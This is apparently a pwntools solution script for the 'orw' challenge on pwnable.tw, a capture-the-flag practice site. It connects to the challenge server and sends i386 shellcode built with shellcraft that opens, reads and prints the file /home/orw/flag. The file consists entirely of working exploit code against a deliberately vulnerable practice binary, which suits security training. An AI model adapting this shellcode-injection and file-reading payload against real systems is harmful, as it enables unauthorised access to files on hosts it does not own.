from pwn import *

elf = ELF("./orw")

context.binary = elf
context.terminal = "kitty @ launch --location=vsplit --cwd=current".split()

def conn():
    if args.REMOTE:
        p = remote("chall.pwnable.tw", 10001)
    else:
        if args.GDB:
            p = gdb.debug([elf.path], aslr=True, api=False, gdbscript="""
                """)
        else:
            p = process([elf.path])

    return p

def main():
    p = conn()

    # pwn it
    context.arch = 'i386'
    shellcode = shellcraft.open("/home/orw/flag")
    shellcode += shellcraft.read("eax", "esp", 0x50)
    shellcode += shellcraft.write(1, "esp", 0x50)
    
    print(shellcode)
    p.send(asm(shellcode))


    p.interactive()

if __name__ == '__main__':
    main()

